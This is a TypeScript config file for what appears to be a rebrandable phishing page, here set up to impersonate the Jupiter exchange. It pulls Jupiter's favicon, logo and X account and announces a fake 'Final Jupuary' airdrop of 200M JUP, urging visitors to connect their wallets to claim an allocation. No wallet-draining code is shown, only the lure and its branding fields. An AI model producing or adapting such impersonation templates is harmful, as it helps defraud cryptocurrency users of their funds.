/**
 * Edit this file to rebrand the invite page.
 *
 * logo — paste an image URL (`/favicon.png`, `https://...`) or a full `<svg>...</svg>` string
 * favicon — tab icon URL
 * description — body copy shown on the invite screen
 * xLink / xLabel — secondary button that opens X
 */
export const templateConfig = {
  brandName: 'Jupiter',
  pageTitle: 'Jupiter | Final Jupuary',
  favicon:
    'https://t0.gstatic.com/faviconV2?client=SOCIAL&type=FAVICON&fallback_opts=TYPE,SIZE,URL&url=http://jup.ag&size=128',

  logo: 'https://logos.hunter.io/jup.ag',
  logoHeight: 32,

  headline: 'Final Jupuary airdrop invitation',
  description:
    '200M JUP for active users and 200M JUP for stakers — the last planned Jupuary distribution. Connect your wallet to verify eligibility and claim your allocation.',

  xLink: 'https://x.com/JupiterExchange',
  xLabel: 'Jupiter',
} as const

export type TemplateConfig = typeof templateConfig

export function isSvgLogo(value: string): boolean {
  return value.trimStart().startsWith('<svg')
}
